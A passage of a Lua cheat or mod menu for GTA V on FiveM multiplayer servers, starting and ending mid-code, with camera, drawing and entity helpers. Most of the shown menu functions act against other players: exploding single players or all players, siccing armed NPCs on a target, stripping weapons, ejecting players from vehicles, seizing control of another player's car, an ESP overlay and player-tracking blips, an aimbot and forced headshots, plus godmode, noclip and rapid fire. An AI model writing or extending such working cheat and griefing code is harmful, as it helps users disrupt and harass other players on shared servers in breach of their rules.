    return ((camPos + (direction * 10.0)) + (vect33 * x)) + (vect34 * y)

end

function WorldToScreenRel(worldCoords)
    local check, x, y = GetScreenCoordFromWorldCoord(worldCoords.x, worldCoords.y, worldCoords.z)
    if not check then
        return false
    end
    
    screenCoordsx = (x - 0.5) * 2.0
    screenCoordsy = (y - 0.5) * 2.0
    return true, screenCoordsx, screenCoordsy
end

function RotationToDirection(rotation)
    local retz = math.rad(rotation.z)
    local retx = math.rad(rotation.x)
    local absx = math.abs(math.cos(retx))
    return vector3(-math.sin(retz) * absx, math.cos(retz) * absx, math.sin(retx))
end

local function GetCamDirection()
    local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(PlayerPedId())
    local pitch = GetGameplayCamRelativePitch()
    
    local x = -math.sin(heading * math.pi / 180.0)
    local y = math.cos(heading * math.pi / 180.0)
    local z = math.sin(pitch * math.pi / 180.0)
    
    local len = math.sqrt(x * x + y * y + z * z)
    if len ~= 0 then
        x = x / len
        y = y / len
        z = z / len
    end
    
    return x, y, z
end

-- END MENYOO/CAMERA FUNCTIONS
-- MENYOO/ENTITY FUNCTIONS
function ApplyForce(entity, direction)
    ApplyForceToEntity(entity, 3, direction, 0, 0, 0, false, false, true, true, false, true)
end

function RequestControlOnce(entity)
    if not NetworkIsInSession or NetworkHasControlOfEntity(entity) then
        return true
    end
    SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(entity), true)
    return NetworkRequestControlOfEntity(entity)
end

function RequestControl(entity)
    Citizen.CreateThread(function()
        local tick = 0
        while not RequestControlOnce(entity) and tick <= 12 do
            tick = tick + 1
            Wait(0)
        end
        return tick <= 12
    end)
end

function Oscillate(entity, position, angleFreq, dampRatio)
    local pos1 = ScaleVector(SubVectors(position, GetEntityCoords(entity)), (angleFreq * angleFreq))
    local pos2 = AddVectors(ScaleVector(GetEntityVelocity(entity), (2.0 * angleFreq * dampRatio)), vector3(0.0, 0.0, 0.1))
    local targetPos = SubVectors(pos1, pos2)
    
    ApplyForce(entity, targetPos)
end

-- END MENYOO/ENTITY FUNCTIONS
-- DRAWING FUNCTIONS
function ShowMPMessage(message, subtitle, ms)
    Citizen.CreateThread(function()
        Citizen.Wait(0)
        function Initialize(scaleform)
            local scaleform = RequestScaleformMovie(scaleform)
            while not HasScaleformMovieLoaded(scaleform) do
                Citizen.Wait(0)
            end
            PushScaleformMovieFunction(scaleform, "SHOW_SHARD_WASTED_MP_MESSAGE")
            PushScaleformMovieFunctionParameterString(message)
            PushScaleformMovieFunctionParameterString(subtitle)
            PopScaleformMovieFunctionVoid()
            Citizen.SetTimeout(6500, function()
                PushScaleformMovieFunction(scaleform, "SHARD_ANIM_OUT")
                PushScaleformMovieFunctionParameterInt(1)
                PushScaleformMovieFunctionParameterFloat(0.33)
                PopScaleformMovieFunctionVoid()
                Citizen.SetTimeout(3000, function()EndScaleformMovieMethod() end)
            end)
            return scaleform
        end
        
        scaleform = Initialize("mp_big_message_freemode")
        
        while true do
            Citizen.Wait(0)
            DrawScaleformMovieFullscreen(scaleform, 255, 255, 255, 150, 0)
        end
    end)
end

function ShowInfo(text)
    SetNotificationTextEntry("STRING")
    AddTextComponentString(text)
    DrawNotification(true, false)
end

function DrawTxt(text, x, y, scale, size)
    SetTextFont(0)
    SetTextProportional(1)
    SetTextScale(scale, size)
    SetTextDropshadow(1, 0, 0, 0, 255)
    SetTextEdge(1, 0, 0, 0, 255)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry("STRING")
    AddTextComponentString(text)
    DrawText(x, y)
end

function DrawText3D(x, y, z, text)
    local onScreen, _x, _y = GetScreenCoordFromWorldCoord(x, y, z)
    local px, py, pz = table.unpack(GetGameplayCamCoords())
    local dist = GetDistanceBetweenCoords(px, py, pz, x, y, z, 1)
    
    local scale = (1 / dist) * 2
    local fov = (1 / GetGameplayCamFov()) * 100
    local scale = scale * fov
    
    if onScreen then
        SetTextScale(0.0 * scale, 0.55 * scale)
        SetTextFont(0)
        SetTextProportional(1)
        SetTextColour(255, 255, 255, 255)
        SetTextDropshadow(0, 0, 0, 0, 255)
        SetTextEdge(2, 0, 0, 0, 150)
        SetTextDropShadow()
        SetTextOutline()
        SetTextEntry("STRING")
        SetTextCentre(1)
        AddTextComponentString(text)
        DrawText(_x, _y)
    end
end

-- END DRAWING FUNCTIONS
-- UTILITY FUNCTIONS
local entityEnumerator = {
    __gc = function(enum)
        if enum.destructor and enum.handle then
            enum.destructor(enum.handle)
        end
        enum.destructor = nil
        enum.handle = nil
    end
}

local function GetHeadItems()
    local headItems = GetNumberOfPedDrawableVariations(PlayerPedId(), 0)
    local faceItemsList = {}
    for i = 1, headItems do
        faceItemsList[i] = i
    end
	return faceItemsList
end

local function GetHeadTextures(faceID)
    local headTextures = GetNumberOfPedTextureVariations(PlayerPedId(), 0, faceID)
	local headTexturesList = {}
    for i = 1, headTextures do
        headTexturesList[i] = i
    end
	return headTexturesList
end

local function GetHairItems()
    local hairItems = GetNumberOfPedDrawableVariations(PlayerPedId(), 2)
    local hairItemsList = {}
    for i = 1, hairItems do
        hairItemsList[i] = i
    end
    return hairItemsList
end

local function GetHairTextures(hairID)
    local hairTexture = GetNumberOfPedTextureVariations(PlayerPedId(), 2, hairID)
    local hairTextureList = {}
    for i = 1, hairTexture do
        hairTextureList[i] = i
    end
    return hairTextureList
end

local function GetMaskItems()
    local maskItems = GetNumberOfPedDrawableVariations(PlayerPedId(), 1)
    local maskItemsList = {}
    for i = 1, maskItems do
        maskItemsList[i] = i
    end
	return maskItemsList
end

local function GetHatItems()
    local hatItems = GetNumberOfPedPropDrawableVariations(PlayerPedId(), 0)
    local hatItemsList = {}
    for i = 1, hatItems do
        hatItemsList[i] = i
    end
	return hatItemsList
end

local function GetHatTextures(hatID)
	local hatTextures = GetNumberOfPedPropTextureVariations(PlayerPedId(), 0, hatID)
	local hatTexturesList = {}
	for i = 1, hatTextures do
        hatTexturesList[i] = i
    end
	return hatTexturesList
end

local function EnumerateEntities(initFunc, moveFunc, disposeFunc)
    return coroutine.wrap(function()
        local iter, id = initFunc()
        if not id or id == 0 then
            disposeFunc(iter)
            return
        end
        
        local enum = {handle = iter, destructor = disposeFunc}
        setmetatable(enum, entityEnumerator)
        
        local next = true
        repeat
            coroutine.yield(id)
            next, id = moveFunc(iter)
        until not next
        
        enum.destructor, enum.handle = nil, nil
        disposeFunc(iter)
    end)
end

function EnumerateObjects()
    return EnumerateEntities(FindFirstObject, FindNextObject, EndFindObject)
end

function EnumeratePeds()
    return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
end

function EnumerateVehicles()
    return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
end

function EnumeratePickups()
    return EnumerateEntities(FindFirstPickup, FindNextPickup, EndFindPickup)
end

function table.contains(table, element)
    for _, value in pairs(table) do
        if value == element then
            return true
        end
    end
    return false
end

function table.removekey(array, element)
    for i = 1, #array do
        if array[i] == element then
            table.remove(array, i)
        end
    end
end

function AddVectors(vect1, vect2)
    return vector3(vect1.x + vect2.x, vect1.y + vect2.y, vect1.z + vect2.z)
end

function SubVectors(vect1, vect2)
    return vector3(vect1.x - vect2.x, vect1.y - vect2.y, vect1.z - vect2.z)
end

function ScaleVector(vect, mult)
    return vector3(vect.x * mult, vect.y * mult, vect.z * mult)
end

function round(num, numDecimalPlaces)
    local mult = 10 ^ (numDecimalPlaces or 0)
    return math.floor(num * mult + 0.5) / mult
end

local function GetKeyboardInput(text)
	if not text then text = "Input" end
    DisplayOnscreenKeyboard(0, "", "", "", "", "", "", 30)
    while (UpdateOnscreenKeyboard() == 0) do
		DrawTxt(text, 0.32, 0.37, 0.0, 0.4)
        DisableAllControlActions(0)
        -- Dont crash the menu when user hits esc
        if IsDisabledControlPressed(0, Keys["ESC"]) then return "" end
        Wait(0)
    end
    if (GetOnscreenKeyboardResult()) then
        local result = GetOnscreenKeyboardResult()
        Wait(0)
        return result
    end
end

-- END UTILITY FUNCTIONS
-- MENU FUNCTIONS
function SpectatePlayer(id)
    local player = GetPlayerPed(id)
    if Spectating then
        RequestCollisionAtCoord(GetEntityCoords(player))
        NetworkSetInSpectatorMode(true, player)
    else
        RequestCollisionAtCoord(GetEntityCoords(player))
        NetworkSetInSpectatorMode(false, player)
    end
end

local function PossessVehicle(target)
    PossessingVeh = not PossessingVeh
    
    if not PossessingVeh then
        SetEntityVisible(PlayerPedId(), true, 0)
        SetEntityCoords(PlayerPedId(), oldPlayerPos)
        SetEntityCollision(PlayerPedId(), true, 1)
    else
        SpectatePlayer(selectedPlayer)
        ShowInfo("~b~Checking Player...")
        Wait(3000)
        if IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
            SpectatePlayer(selectedPlayer)
            oldPlayerPos = GetEntityCoords(PlayerPedId())
            SetEntityVisible(PlayerPedId(), false, 0)
            SetEntityCollision(PlayerPedId(), false, 0)
        else
            SpectatePlayer(selectedPlayer)
            PossessingVeh = false
            ShowInfo("~r~Player not in a vehicle!  (Try again?)")
        end
        
        
        local Markerloc = nil
        
        -- Main loop for posessing veh
        Citizen.CreateThread(function()
            local ped = GetPlayerPed(target)
            local veh = GetVehiclePedIsIn(ped, 0)
            
            while PossessingVeh do
                
                DrawTxt("~b~Possessing ~w~" .. GetPlayerName(target) .. "'s ~b~Vehicle", 0.1, 0.05, 0.0, 0.4)
                DrawTxt("~b~Controls:\n~w~-------------------", 0.1, 0.2, 0.0, 0.4)
                DrawTxt("~b~W/S: ~w~Forward/Back\n~b~SPACEBAR: ~w~Up\n~b~CTRL: ~w~Down\n~b~X: ~w~Cancel", 0.1, 0.25, 0.0, 0.4)
                Markerloc = GetGameplayCamCoord() + (RotationToDirection(GetGameplayCamRot(2)) * 20)
                DrawMarker(28, Markerloc, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 1.0, 1.0, 1.0, 0, 0, 180, 35, false, true, 2, nil, nil, false)
                
                local forward = SubVectors(Markerloc, GetEntityCoords(veh))
                local vpos = GetEntityCoords(veh)
                local vf = GetEntityForwardVector(veh)
                local vrel = SubVectors(vpos, vf)
                
                SetEntityCoords(PlayerPedId(), vrel.x, vrel.y, vpos.z + 1.1)
                SetEntityNoCollisionEntity(PlayerPedId(), veh, 1)
                
                RequestControlOnce(veh)
                
                if IsDisabledControlPressed(0, Keys["W"]) then
                    ApplyForce(veh, forward * 0.1)
                end
                
                if IsDisabledControlPressed(0, Keys["S"]) then
                    ApplyForce(veh, -(forward * 0.1))
                end
                
                if IsDisabledControlPressed(0, Keys["SPACE"]) then
                    ApplyForceToEntity(veh, 3, 0.0, 0.0, 1.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                end
                
                if IsDisabledControlPressed(0, Keys["LEFTCTRL"]) then
                    ApplyForceToEntity(veh, 3, 0.0, 0.0, -1.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                end
                
                if IsDisabledControlPressed(0, Keys["X"]) or GetEntityHealth(PlayerPedId()) < 5.0 then
                    PossessingVeh = false
                    SetEntityVisible(PlayerPedId(), true, 0)
                    SetEntityCoords(PlayerPedId(), oldPlayerPos)
                    SetEntityCollision(PlayerPedId(), true, 1)
                end
                
                Wait(0)
            end
        end)
    end
end

function GetWeaponNameFromHash(hash)
    for i = 1, #allweapons do
        if GetHashKey(allweapons[i]) == hash then
            return string.sub(allweapons[i], 8)
        end
    end
end

local function FixVeh(veh)
    SetVehicleEngineHealth(veh, 1000)
    SetVehicleFixed(veh)
end

local function ExplodePlayer(target)
    local ped = GetPlayerPed(target)
    local coords = GetEntityCoords(ped)
    AddExplosion(coords.x + 1, coords.y + 1, coords.z + 1, 4, 100.0, true, false, 0.0)
end

local function ExplodeAll(self)
    local plist = GetActivePlayers()
    for i = 0, #plist do
        if not self and i == PlayerId() then i = i + 1 end
        ExplodePlayer(i)
    end
end

-- Thanks to Fallen#0811 for the idea
local function PedAttack(target, attackType)
    local coords = GetEntityCoords(GetPlayerPed(target))
    
    if attackType == 1 then weparray = allweapons
    elseif attackType == 2 then weparray = meleeweapons
    elseif attackType == 3 then weparray = pistolweapons
    elseif attackType == 4 then weparray = heavyweapons
    end
    
    for k in EnumeratePeds() do
        if k ~= GetPlayerPed(target) and not IsPedAPlayer(k) and GetDistanceBetweenCoords(coords, GetEntityCoords(k)) < 2000 then
            local rand = math.ceil(math.random(#weparray))
            if weparray ~= allweapons then GiveWeaponToPed(k, GetHashKey(weparray[rand][1]), 9999, 0, 1)
            else GiveWeaponToPed(k, GetHashKey(weparray[rand]), 9999, 0, 1) end
            ClearPedTasks(k)
            TaskCombatPed(k, GetPlayerPed(target), 0, 16)
            SetPedCombatAbility(k, 100)
            SetPedCombatRange(k, 2)
            SetPedCombatAttributes(k, 46, 1)
            SetPedCombatAttributes(k, 5, 1)
        end
    end
end

-- Adapted from Shockwave by scmorio - https://www.gta5-mods.com/scripts/shockwave
function ApplyShockwave(entity)
    local pos = GetEntityCoords(PlayerPedId())
    local coord = GetEntityCoords(entity)
    local dx = coord.x - pos.x
    local dy = coord.y - pos.y
    local dz = coord.z - pos.z
    local distance = math.sqrt(dx * dx + dy * dy + dz * dz)
    local distanceRate = (50 / distance) * math.pow(1.04, 1 - distance)
    ApplyForceToEntity(entity, 1, distanceRate * dx, distanceRate * dy, distanceRate * dz, math.random() * math.random(-1, 1), math.random() * math.random(-1, 1), math.random() * math.random(-1, 1), true, false, true, true, true, true)
end

local function DoForceFieldTick(radius)
    local player = PlayerPedId()
    local coords = GetEntityCoords(PlayerPedId())
    local playerVehicle = GetPlayersLastVehicle()
    local inVehicle = IsPedInVehicle(player, playerVehicle, true)
    
    DrawMarker(28, coords.x, coords.y, coords.z, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, radius, radius, radius, 180, 80, 0, 35, false, true, 2, nil, nil, false)
    
    for k in EnumerateVehicles() do
        if (not inVehicle or k ~= playerVehicle) and GetDistanceBetweenCoords(coords, GetEntityCoords(k)) <= radius * 1.2 then
            RequestControlOnce(k)
            ApplyShockwave(k)
        end
    end
    
    for k in EnumeratePeds() do
        if k ~= PlayerPedId() and GetDistanceBetweenCoords(coords, GetEntityCoords(k)) <= radius * 1.2 then
            RequestControlOnce(k)
            SetPedRagdollOnCollision(k, true)
            SetPedRagdollForceFall(k)
            ApplyShockwave(k)
        end
    end
end

local function DoRapidFireTick()
    DisablePlayerFiring(PlayerPedId(), true)
    if IsDisabledControlPressed(0, Keys["MOUSE1"]) then
        local _, weapon = GetCurrentPedWeapon(PlayerPedId())
        local wepent = GetCurrentPedWeaponEntityIndex(PlayerPedId())
        local camDir = GetCamDirFromScreenCenter()
        local camPos = GetGameplayCamCoord()
        local launchPos = GetEntityCoords(wepent)
        local targetPos = camPos + (camDir * 200.0)
        
        ClearAreaOfProjectiles(launchPos, 0.0, 1)
        
        ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, weapon, PlayerPedId(), true, true, 24000.0)
        ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, weapon, PlayerPedId(), true, true, 24000.0)
    end
end

local function StripPlayer(target)
    local ped = GetPlayerPed(target)
    RemoveAllPedWeapons(ped, false)
end

local function StripAll(self)
    local plist = GetActivePlayers()
    for i = 0, #plist do
        if not self and i == PlayerId() then i = i + 1 end
        StripPlayer(i)
    end
end

local function KickFromVeh(target)
    local ped = GetPlayerPed(target)
    if IsPedInAnyVehicle(ped, false) then
        ClearPedTasksImmediately(ped)
    end
end

local function KickAllFromVeh(self)
    local plist = GetActivePlayers()
    for i = 0, #plist do
        if not self and i == PlayerId() then i = i + 1 end
        KickFromVeh(i)
    end
end

local function CancelAnimsAll(self)
    local plist = GetActivePlayers()
    for i = 0, #plist do
        if not self and i == PlayerId() then i = i + 1 end
        ClearPedTasksImmediately(GetPlayerPed(plist[i]))
    end
end

local function RandomClothes(target)
    local ped = GetPlayerPed(target)
    SetPedRandomComponentVariation(ped, false)
    SetPedRandomProps(ped)
end

local function GiveAllWeapons(target)
    local ped = GetPlayerPed(target)
    for i = 0, #allweapons do
        GiveWeaponToPed(ped, GetHashKey(allweapons[i]), 9999, false, false)
    end
end

local function GiveAllPlayersWeapons(self)
    local plist = GetActivePlayers()
    for i = 0, #plist do
        if not self and i == PlayerId() then i = i + 1 end
        GiveAllWeapons(i)
    end
end

local function GiveWeapon(target, weapon)
    local ped = GetPlayerPed(target)
    GiveWeaponToPed(ped, GetHashKey(weapon), 9999, false, false)
end

local function GiveMaxAmmo(target)
    local ped = GetPlayerPed(target)
    for i = 1, #allweapons do
        AddAmmoToPed(ped, GetHashKey(allweapons[i]), 9999)
    end
end

local function TeleportToPlayer(target)
    local ped = GetPlayerPed(target)
    local pos = GetEntityCoords(ped)
    SetEntityCoords(PlayerPedId(), pos)
end

local function TeleportToWaypoint()-- TP to Waypoint by samyh89 - https://gist.github.com/samyh89/32a780abcd1eea05ab32a61985857486
    local entity = PlayerPedId()
    if IsPedInAnyVehicle(entity, false) then
        entity = GetVehiclePedIsUsing(entity)
    end
    local success = false
    local blipFound = false
    local blipIterator = GetBlipInfoIdIterator()
    local blip = GetFirstBlipInfoId(8)
    
    while DoesBlipExist(blip) do
        if GetBlipInfoIdType(blip) == 4 then
            cx, cy, cz = table.unpack(Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector()))--GetBlipInfoIdCoord(blip)
            blipFound = true
            break
        end
        blip = GetNextBlipInfoId(blipIterator)
        Wait(0)
    end
    
    if blipFound then
        local groundFound = false
        local yaw = GetEntityHeading(entity)
        
        for i = 0, 1000, 1 do
            SetEntityCoordsNoOffset(entity, cx, cy, ToFloat(i), false, false, false)
            SetEntityRotation(entity, 0, 0, 0, 0, 0)
            SetEntityHeading(entity, yaw)
            SetGameplayCamRelativeHeading(0)
            Wait(0)
            if GetGroundZFor_3dCoord(cx, cy, ToFloat(i), cz, false) then
                cz = ToFloat(i)
                groundFound = true
                break
            end
        end
        if not groundFound then
            cz = -300.0
        end
        success = true
    else
        ShowInfo('~r~Blip not found')
    end
    
    if success then
        SetEntityCoordsNoOffset(entity, cx, cy, cz, false, false, true)
        SetGameplayCamRelativeHeading(0)
        if IsPedSittingInAnyVehicle(PlayerPedId()) then
            if GetPedInVehicleSeat(GetVehiclePedIsUsing(PlayerPedId()), -1) == PlayerPedId() then
                SetVehicleOnGroundProperly(GetVehiclePedIsUsing(PlayerPedId()))
            end
        end
    end

end

local function ToggleGodmode(tog)
    local ped = PlayerPedId()
    SetEntityProofs(ped, tog, tog, tog, tog, tog)
    SetPedCanRagdoll(ped, not tog)
end

local function ToggleNoclip()
    Noclipping = not Noclipping
    if Noclipping then
        SetEntityVisible(PlayerPedId(), false, false)
    else
        SetEntityRotation(GetVehiclePedIsIn(PlayerPedId(), 0), GetGameplayCamRot(2), 2, 1)
        SetEntityVisible(GetVehiclePedIsIn(PlayerPedId(), 0), true, false)
        SetEntityVisible(PlayerPedId(), true, false)
    end
end

local function ToggleESP()
    ESPEnabled = not ESPEnabled
	local _,x,y = false, 0.0, 0.0
	
	Citizen.CreateThread(function()
		while ESPEnabled do
            local plist = GetActivePlayers()
            table.removekey(plist, PlayerId())
            for i = 1, #plist do
				local targetCoords = GetEntityCoords(GetPlayerPed(plist[i]))
				_, x, y = GetScreenCoordFromWorldCoord(targetCoords.x, targetCoords.y, targetCoords.z)
			end
			Wait(ESPRefreshTime)
		end
	end)
	
    Citizen.CreateThread(function()
        while ESPEnabled do
            local plist = GetActivePlayers()
            table.removekey(plist, PlayerId())
            for i = 1, #plist do
                local targetCoords = GetEntityCoords(GetPlayerPed(plist[i]))
                local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), targetCoords)
                if distance <= EspDistance then
                    local _, wephash = GetCurrentPedWeapon(GetPlayerPed(plist[i]), 1)
                    local wepname = GetWeaponNameFromHash(wephash)
                    local vehname = "On Foot"
                    if IsPedInAnyVehicle(GetPlayerPed(plist[i]), 0) then
                        vehname = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(GetPlayerPed(plist[i])))))
                    end
                    if wepname == nil then wepname = "Unknown" end
                    DrawRect(x, y, 0.008, 0.01, 0, 0, 255, 255)
                    DrawRect(x, y, 0.003, 0.005, 255, 0, 0, 255)
                    local espstring1 = "~b~ID: ~w~" .. GetPlayerServerId(plist[i]) .. "~w~  |  ~b~Name: ~w~" .. GetPlayerName(plist[i]) .. "  |  ~b~Distance: ~w~" .. math.floor(distance)
                    local espstring2 = "~b~Weapon: ~w~" .. wepname .. "  |  ~b~Vehicle: ~w~" .. vehname
                    DrawTxt(espstring1, x - 0.05, y - 0.04, 0.0, 0.2)
                    DrawTxt(espstring2, x - 0.05, y - 0.03, 0.0, 0.2)
                end
            end
            Wait(0)
        end
    end)
end

-- Blips from Scammer's Script Collection (https://forum.fivem.net/t/release-scammers-script-collection-09-03-17/3313)
-- Slightly modified to allow blip toggling
function ToggleBlips()
    BlipsEnabled = not BlipsEnabled
    
    if not BlipsEnabled then
        for i = 1, #pblips do
            RemoveBlip(pblips[i])
        end
    else
        
        Citizen.CreateThread(function()
            pblips = {}
            while BlipsEnabled do
                local plist = GetActivePlayers()
                table.removekey(plist, PlayerId())
                for i = 1, #plist do
                    if NetworkIsPlayerActive(plist[i]) then --and GetPlayerPed( id ) ~= GetPlayerPed( -1 ) then
                        ped = GetPlayerPed(plist[i])
                        pblips[i] = GetBlipFromEntity(ped)
                        if not DoesBlipExist(pblips[i]) then
                            pblips[i] = AddBlipForEntity(ped)
                            SetBlipSprite(pblips[i], 1)
                            Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], true)-- Player Blip indicator
                        else
                            veh = GetVehiclePedIsIn(ped, false)
                            blipSprite = GetBlipSprite(pblips[i])
                            if not GetEntityHealth(ped) then -- dead
                                if blipSprite ~= 274 then
                                    SetBlipSprite(pblips[i], 274)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)-- Player Blip indicator
                                end
                            elseif veh then
                                vehClass = GetVehicleClass(veh)
                                vehModel = GetEntityModel(veh)
                                if vehClass == 15 then -- jet
                                    if blipSprite ~= 422 then
                                        SetBlipSprite(pblips[i], 422)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)-- Player Blip indicator
                                    end
                                elseif vehClass == 16 then -- plane
                                    if vehModel == GetHashKey("besra") or vehModel == GetHashKey("hydra")
                                        or vehModel == GetHashKey("lazer") then -- jet
                                        if blipSprite ~= 424 then
                                            SetBlipSprite(pblips[i], 424)
                                            Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)-- Player Blip indicator
                                        end
                                    elseif blipSprite ~= 423 then
                                        SetBlipSprite(pblips[i], 423)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)-- Player Blip indicator
                                    end
                                elseif vehClass == 14 then -- boat
                                    if blipSprite ~= 427 then
                                        SetBlipSprite(pblips[i], 427)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)-- Player Blip indicator
                                    end
                                elseif vehModel == GetHashKey("insurgent") or vehModel == GetHashKey("insurgent2")
                                    or vehModel == GetHashKey("limo2") then -- insurgent (+ turreted limo cuz limo pblips[i] wont work)
                                    if blipSprite ~= 426 then
                                        SetBlipSprite(pblips[i], 426)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)-- Player Blip indicator
                                    end
                                elseif vehModel == GetHashKey("rhino") then -- tank
                                    if blipSprite ~= 421 then
                                        SetBlipSprite(pblips[i], 421)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)-- Player Blip indicator
                                    end
                                elseif blipSprite ~= 1 then -- default pblips[i]
                                    SetBlipSprite(pblips[i], 1)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], true)-- Player Blip indicator
                                end
                                
                                -- Show number in case of passangers
                                passengers = GetVehicleNumberOfPassengers(veh)
                                if passengers then
                                    if not IsVehicleSeatFree(veh, -1) then
                                        passengers = passengers + 1
                                    end
                                    ShowNumberOnBlip(pblips[i], passengers)
                                else
                                    HideNumberOnBlip(pblips[i])
                                end
                            else
                                
                                -- Remove leftover number
                                HideNumberOnBlip(pblips[i])
                                if blipSprite ~= 1 then -- default pblips[i]
                                    SetBlipSprite(pblips[i], 1)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], true)-- Player Blip indicator
                                end
                            end
                            SetBlipRotation(pblips[i], math.ceil(GetEntityHeading(veh)))-- update rotation
                            SetBlipNameToPlayerName(pblips[i], plist[i])-- update pblips[i] name
                            SetBlipScale(pblips[i], 0.85)-- set scale
                            
                            -- set player alpha
                            if IsPauseMenuActive() then
                                SetBlipAlpha(pblips[i], 255)
                            else
                                x1, y1 = table.unpack(GetEntityCoords(PlayerPedId(), true))
                                x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(plist[i]), true))
                                distance = (math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1)) + 900
                                if distance < 0 then
                                    distance = 0
                                elseif distance > 255 then
                                    distance = 255
                                end
                                SetBlipAlpha(pblips[i], distance)
                            end
                        end
                    end
                end
                Wait(0)
            end
        end)
    end
end

local function ShootAt(target, bone)
    local boneTarget = GetPedBoneCoords(target, GetEntityBoneIndexByName(target, bone), 0.0, 0.0, 0.0)
    SetPedShootsAtCoord(PlayerPedId(), boneTarget, true)
end

local function ShootAt2(target, bone, damage)
    local boneTarget = GetPedBoneCoords(target, GetEntityBoneIndexByName(target, bone), 0.0, 0.0, 0.0)
    local _, weapon = GetCurrentPedWeapon(PlayerPedId())
    ShootSingleBulletBetweenCoords(AddVectors(boneTarget, vector3(0, 0, 0.1)), boneTarget, damage, true, weapon, PlayerPedId(), true, true, 1000.0)
end

local function ShootAimbot(k)
    if IsEntityOnScreen(k) and HasEntityClearLosToEntityInFront(PlayerPedId(), k) and
        not IsPedDeadOrDying(k) and not IsPedInVehicle(k, GetVehiclePedIsIn(k), false) and 
		IsDisabledControlPressed(0, Keys["MOUSE1"]) and IsPlayerFreeAiming(PlayerId()) then
        local x, y, z = table.unpack(GetEntityCoords(k))
        local _, _x, _y = World3dToScreen2d(x, y, z)
        if _x > 0.25 and _x < 0.75 and _y > 0.25 and _y < 0.75 then
            local _, weapon = GetCurrentPedWeapon(PlayerPedId())
            ShootAt2(k, AimbotBone, GetWeaponDamage(weapon, 1))
        end
    end
end

local function RageShoot(target)
    if not IsPedDeadOrDying(target) then
        local boneTarget = GetPedBoneCoords(target, GetEntityBoneIndexByName(target, "SKEL_HEAD"), 0.0, 0.0, 0.0)
        local _, weapon = GetCurrentPedWeapon(PlayerPedId())
        ShootSingleBulletBetweenCoords(AddVectors(boneTarget, vector3(0, 0, 0.1)), boneTarget, 9999, true, weapon, PlayerPedId(), false, false, 1000.0)
        ShootSingleBulletBetweenCoords(AddVectors(boneTarget, vector3(0, 0.1, 0)), boneTarget, 9999, true, weapon, PlayerPedId(), false, false, 1000.0)
        ShootSingleBulletBetweenCoords(AddVectors(boneTarget, vector3(0.1, 0, 0)), boneTarget, 9999, true, weapon, PlayerPedId(), false, false, 1000.0)
    end
end

local function NameToBone(name)
    if name == "Head" then
        return "SKEL_Head"
    elseif name == "Chest" then
        return "SKEL_Spine2"
    elseif name == "Left Arm" then
        return "SKEL_L_UpperArm"
    elseif name == "Right Arm" then
        return "SKEL_R_UpperArm"
    elseif name == "Left Leg" then
        return "SKEL_L_Thigh"
    elseif name == "Right Leg" then
        return "SKEL_R_Thigh"
    elseif name == "Dick" then
        return "SKEL_Pelvis"
    else
        return "SKEL_ROOT"
    end
end

local function SpawnVeh(model, PlaceSelf, SpawnEngineOn)
    RequestModel(GetHashKey(model))
    Wait(500)
    if HasModelLoaded(GetHashKey(model)) then
        local coords = GetEntityCoords(PlayerPedId())
        local xf = GetEntityForwardX(PlayerPedId())
        local yf = GetEntityForwardY(PlayerPedId())
        local heading = GetEntityHeading(PlayerPedId())
        local veh = CreateVehicle(GetHashKey(model), coords.x + xf * 5, coords.y + yf * 5, coords.z, heading, 1, 1)
        if PlaceSelf then SetPedIntoVehicle(PlayerPedId(), veh, -1) end
        if SpawnEngineOn then SetVehicleEngineOn(veh, 1, 1) end
        return veh
    else ShowInfo("~r~Model not recognized (Try Again)") end
end

local function SpawnVehAtCoords(model, coords)
    RequestModel(GetHashKey(model))
    Wait(500)
    if HasModelLoaded(GetHashKey(model)) then
		local veh = CreateVehicle(GetHashKey(model), coords.x + 1.0, coords.y + 1.0, coords.z, 0.0, 1, 1)
		ShowInfo("Vehicle ~g~Spawned")
		return veh
    else ShowInfo("~r~Model not recognized (Try Again)") end
end

local function SpawnPlane(model, PlaceSelf, SpawnInAir)
    RequestModel(GetHashKey(model))
    Wait(500)
    if HasModelLoaded(GetHashKey(model)) then
        local coords = GetEntityCoords(PlayerPedId())
        local xf = GetEntityForwardX(PlayerPedId())
        local yf = GetEntityForwardY(PlayerPedId())
        local heading = GetEntityHeading(PlayerPedId())
        local veh = nil
        if SpawnInAir then
            veh = CreateVehicle(GetHashKey(model), coords.x + xf * 20, coords.y + yf * 20, coords.z + 500, heading, 1, 1)
        else
            veh = CreateVehicle(GetHashKey(model), coords.x + xf * 5, coords.y + yf * 5, coords.z, heading, 1, 1)
        end
        if PlaceSelf then SetPedIntoVehicle(PlayerPedId(), veh, -1) end
    else ShowInfo("~r~Model not recognized (Try Again)") end
end

--[[
0 - Head
1 - Beard
2 - Hair
3 - Torso
4 - Legs
5 - Hands
6 - Foot
7 - None?
8 - Accessories like parachute, scuba tank
